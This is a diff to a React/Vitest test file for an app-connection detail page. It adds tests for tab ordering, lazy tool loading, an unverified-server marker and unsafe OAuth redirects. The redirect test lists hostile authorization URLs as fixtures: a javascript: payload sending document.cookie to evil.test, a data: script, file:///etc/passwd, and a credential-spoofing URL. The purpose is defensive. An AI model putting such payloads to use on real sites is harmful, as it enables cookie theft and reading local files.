@@ -6,6 +6,7 @@ import { createRoot } from "react-dom/client";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { AppDetail } from "./AppDetail";
+import { APP_TABS } from "./app-tabs";
 
 const getConnectionMock = vi.hoisted(() => vi.fn());
 const getConnectionInstallsMock = vi.hoisted(() => vi.fn());
@@ -88,8 +89,9 @@ vi.mock("@/context/BreadcrumbContext", () => ({
   useBreadcrumbs: () => ({ setBreadcrumbs: vi.fn() }),
 }));
 
+const pushToastMock = vi.hoisted(() => vi.fn());
 vi.mock("@/context/ToastContext", () => ({
-  useToast: () => ({ pushToast: vi.fn() }),
+  useToast: () => ({ pushToast: pushToastMock }),
 }));
 
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
@@ -244,7 +246,7 @@ describe("AppDetail", () => {
     startOAuthMock.mockResolvedValue({
       connectionId: "conn-1",
       provider: "smoke_lab",
-      authorizationUrl: "http://example.test/oauth",
+      authorizationUrl: "https://example.test/oauth",
       expiresAt: "2026-07-10T00:00:00.000Z",
     });
   });
@@ -268,6 +270,17 @@ describe("AppDetail", () => {
     await flushReact();
   }
 
+  it("places Test immediately below Setup", () => {
+    expect(APP_TABS.map((tab) => tab.key)).toEqual([
+      "setup",
+      "test",
+      "review",
+      "permissions",
+      "activity",
+      "advanced",
+    ]);
+  });
+
   it("pauses the app by flipping the connection enabled flag", async () => {
     await renderAppDetail();
 
@@ -284,6 +297,23 @@ describe("AppDetail", () => {
     expect(updateConnectionMock).toHaveBeenCalledWith("conn-1", { enabled: false });
   });
 
+  it("keeps the unverified-server marker on URL-only connection details", async () => {
+    getConnectionMock.mockResolvedValue(
+      connection({
+        name: "127.0.0.1",
+        config: { url: "http://127.0.0.1:8848/mcp" },
+        transportConfig: { url: "http://127.0.0.1:8848/mcp" },
+      }),
+    );
+
+    await renderAppDetail();
+
+    expect(container.textContent).toContain("Custom app");
+    expect(container.textContent).toContain("hosted at 127.0.0.1");
+    expect(container.textContent).toContain("Unverified server");
+    expect(container.textContent).toContain("127.0.0.1:8848");
+  });
+
   it("redirects a missing tab to setup", async () => {
     mockParams.tab = undefined;
 
@@ -293,19 +323,41 @@ describe("AppDetail", () => {
   });
 
   it.each([
-    ["setup", "Agents can use this app"],
-    ["review", "Review 1 new action"],
-    ["permissions", "Action permissions"],
-    ["activity", "No activity yet."],
-    ["advanced", "Technical details"],
-  ])("renders the %s tab panel", async (tab, expectedText) => {
+    ["setup", "Agents can use this app", false],
+    ["review", "Review 1 new action", true],
+    ["permissions", "Action permissions", true],
+    ["activity", "No activity yet.", false],
+    ["advanced", "Technical details", false],
+  ])("renders the %s tab panel", async (tab, expectedText, showsActionCount) => {
     mockParams.tab = tab;
 
     await renderAppDetail();
 
     expect(container.textContent).toContain("GitHub");
-    expect(container.textContent).toContain("2 actions available");
+    expect(container.textContent?.includes("2 actions available")).toBe(showsActionCount);
     expect(container.textContent).toContain(expectedText);
+    expect(container.querySelector("section.bg-card")).toBeNull();
+  });
+
+  it("renders setup without waiting for tool discovery", async () => {
+    listCatalogMock.mockImplementation(() => new Promise(() => undefined));
+
+    await renderAppDetail();
+
+    expect(container.textContent).toContain("Agents can use this app");
+    expect(container.textContent).not.toContain("Loading tools");
+    expect(listCatalogMock).not.toHaveBeenCalled();
+  });
+
+  it("shows an explicit lazy-loading state while a tool tab discovers actions", async () => {
+    mockParams.tab = "permissions";
+    listCatalogMock.mockImplementation(() => new Promise(() => undefined));
+
+    await renderAppDetail();
+
+    expect(container.textContent).toContain("GitHub");
+    expect(container.textContent).toContain("Loading tools…");
+    expect(container.textContent).not.toContain("Action permissions");
   });
 
   it("hides secret URL parameters in advanced technical details", async () => {
@@ -403,6 +455,7 @@ describe("AppDetail", () => {
     expect(container.textContent).toContain("Agents can use this app");
     expect(container.textContent).not.toContain("Read repo");
     expect(container.textContent).not.toContain("Action permissions");
+    expect(container.querySelector("section.bg-card")).toBeNull();
   });
 
   it("shows the Smoke OAuth connection action for the installed HTTP fixture", async () => {
@@ -533,6 +586,7 @@ describe("AppDetail", () => {
     const writeSelect = container.querySelector<HTMLSelectElement>('select[aria-label="Write issue permission"]');
     expect(readSelect?.value).toBe("allowed");
     expect(writeSelect?.value).toBe("ask");
+    expect(container.querySelector("section.bg-card")).toBeNull();
   });
 
   it("persists ask-first for read-only actions from the unified dropdown", async () => {
@@ -795,6 +849,47 @@ describe("AppDetail", () => {
     await flushReact();
 
     expect(startOAuthMock).toHaveBeenCalledWith("conn-1");
-    expect(navigateTopLevelMock).toHaveBeenCalledWith("http://example.test/oauth");
+    expect(navigateTopLevelMock).toHaveBeenCalledWith("https://example.test/oauth");
+  });
+
+  /**
+   * PAP-17099 — the server refuses to hand out an unsafe authorization endpoint,
+   * but this is the boundary where one would actually execute, so the board must
+   * refuse it independently of what the response body says.
+   */
+  it.each([
+    ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
+    ["data:", "data:text/html,<script>alert(document.domain)</script>"],
+    ["file:", "file:///etc/passwd"],
+    ["plaintext http", "http://evil.test/authorize"],
+    ["credentials", "https://accounts.example.test@evil.test/authorize"],
+  ])("never navigates to a %s authorization url", async (_label, authorizationUrl) => {
+    mockParams.tab = "permissions";
+    getConnectionMock.mockResolvedValue(connection({
+      authKind: "oauth",
+      healthStatus: "failed",
+      healthMessage: "Authorization expired (invalid_grant).",
+    }));
+    startOAuthMock.mockResolvedValue({
+      connectionId: "conn-1",
+      provider: "generic",
+      authorizationUrl,
+      expiresAt: "2026-07-10T00:00:00.000Z",
+    });
+
+    await renderAppDetail();
+    await act(async () => {
+      Array.from(container.querySelectorAll("button"))
+        .find((button) => button.textContent?.trim() === "Reconnect")
+        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
+    });
+    await flushReact();
+
+    expect(navigateTopLevelMock).not.toHaveBeenCalled();
+    expect(pushToastMock).toHaveBeenCalledWith(expect.objectContaining({ tone: "error" }));
+    // The refusal explains itself without echoing the hostile URL back into the DOM.
+    const body = String(pushToastMock.mock.calls.at(-1)?.[0]?.body ?? "");
+    expect(body.length).toBeGreaterThan(0);
+    expect(body).not.toContain(authorizationUrl);
   });
 });
